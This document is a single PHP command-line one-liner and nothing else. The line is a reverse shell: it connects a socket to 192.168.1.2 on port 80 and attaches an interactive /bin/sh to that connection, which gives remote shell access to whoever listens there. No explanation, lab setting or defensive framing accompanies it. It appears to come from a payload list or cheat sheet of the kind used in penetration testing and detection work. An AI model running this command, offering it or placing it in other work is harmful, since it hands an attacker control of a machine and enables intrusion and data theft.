php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'

